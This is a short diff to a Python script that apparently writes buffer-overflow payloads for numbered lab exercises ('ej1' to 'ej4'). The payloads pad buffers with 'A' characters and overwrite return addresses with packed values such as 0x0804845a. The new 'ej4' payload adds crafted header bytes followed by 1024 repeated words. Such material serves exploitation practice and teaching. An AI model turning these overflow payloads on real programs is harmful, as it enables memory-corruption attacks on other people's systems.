@@ -1,5 +1,5 @@
 from struct import pack
-
+'''
 #ej1
 f = open('ej1','wb')
 f.write('A'*80+'DCBA')
@@ -23,3 +23,6 @@ f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
 #ej 1,2 y 3 
 f = open('ej1_2y3', 'wb')
 f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
+'''
+f = open('ej4', 'wb')
+f.write('\x01\x04\x00\x80' + '\x42\x00\x00\x00' * 1024 + '\x01\x00\x00\x00')
